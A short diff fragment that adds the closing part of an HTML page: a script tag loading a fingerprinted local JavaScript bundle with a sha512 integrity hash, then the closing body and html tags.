+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+
+
+
+
+    </body>
+</html>
